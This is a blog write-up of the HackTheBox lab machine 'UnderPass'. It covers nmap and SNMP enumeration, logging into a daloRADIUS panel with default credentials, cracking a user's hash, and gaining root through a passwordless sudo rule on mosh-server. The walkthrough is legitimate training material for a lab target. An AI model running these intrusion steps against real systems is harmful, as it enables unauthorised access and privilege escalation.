---
title: "UnderPass - Writeup"
classes: single
ribbon: LightBlue
categories:
  - writeup
tags:
  - writeups
  - pentest
  - writeup
  - oscp
  - shell
  - exploit
  - htb
  - hackthebox
  - machine
  - easy
  - linux
toc: true
hide_title: true
excerpt: ""
sidebar:
        nav: "menu_writeups"
---

## UnderPass
![](https://kar0nx.github.io/assets/images/writeup/456a4d2e52f182847fb0a2dba0420a44.png)
## Reconnaissance

IP: 10.10.11.48
## NMAP

```
nmap -T4 -p- -A 10.10.11.48
```

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-29 14:07 UTC
Nmap scan report for 10.10.11.48
Host is up (0.030s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 48:b0:d2:c7:29:26:ae:3d:fb:b7:6b:0f:f5:4d:2a:ea (ECDSA)
|_  256 cb:61:64:b8:1b:1b:b5:ba:b8:45:86:c5:16:bb:e2:a2 (ED25519)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.52 (Ubuntu)
Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 199/tcp)
HOP RTT      ADDRESS
1   29.87 ms 10.10.14.1
2   30.30 ms 10.10.11.48

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.51 seconds
```

Starting with nmap I found 2 open ports
## Website
### Site

Starting with http we can spot default apache page

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250829160801.png)

Cannot find anything usefull so I run UDP scan and found SNMP

## NMAP, autorecon

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250829162209.png)

```
nmap 10.10.11.48 --script=snmp* -sU
```

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-29 14:28 UTC
Stats: 0:02:43 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan
UDP Scan Timing: About 17.20% done; ETC: 14:44 (0:13:09 remaining)
Nmap scan report for UnDerPass.htb (10.10.11.48)
Host is up (0.033s latency).
Not shown: 997 closed udp ports (port-unreach)
PORT     STATE         SERVICE
161/udp  open          snmp
| snmp-info: 
|   enterprise: net-snmp
|   engineIDFormat: unknown
|   engineIDData: c7ad5c4856d1cf6600000000
|   snmpEngineBoots: 31
|_  snmpEngineTime: 39m54s
| snmp-sysdescr: Linux underpass 5.15.0-126-generic #136-Ubuntu SMP Wed Nov 6 10:38:22 UTC 2024 x86_64
|_  System uptime: 39m55.16s (239516 timeticks)
| snmp-brute: 
|_  public - Valid credentials
1812/udp open|filtered radius
1813/udp open|filtered radacct

Nmap done: 1 IP address (1 host up) scanned in 1053.22 seconds

```

## SNMP

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250829163454.png)

I searched for "daloradius" in google and found that is RADIUS web management application for managing hotspots:
https://github.com/lirantal/daloradius

we can see on github that this app is written in PHP

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250829165326.png)

I tried few combinations and /daloradius was working, so I used feroxbuster to scan for php extension:

```
feroxbuster -u http://10.10.11.48/daloradius -x php -s 200
```

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250829165507.png)

And we found login panel:

```
http://10.10.11.48/daloradius/app/operators/login.php
```

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250829165735.png)

 Tried default credentials and I manage to login

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250829165921.png)

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250829165950.png)

In users we can see 1 user svcMosh and hash

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250829170117.png)

## Gaining Access

cracked it with crackstation

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250829170136.png)

underwaterfriends
and I was able to gain access via ssh

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250829170238.png)

## Privilege Escalation

Starting with sudo -l we see that svcMosh can run sudo without password with /usr/bin/mosh-server 

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250829170324.png)

Searching google I found good article about priv esc
https://www.hackingdream.net/2020/03/linux-privilege-escalation-techniques.html

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250829170552.png)

```
mosh --server="sudo /usr/bin/mosh-server" localhost
```

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250829170626.png)

Now navigate to /root/root.txt

## Alternative to start

Use common.txt :D

```
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt:FUZZ -u http://10.10.11.48/FUZZ
```

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250829171912.png)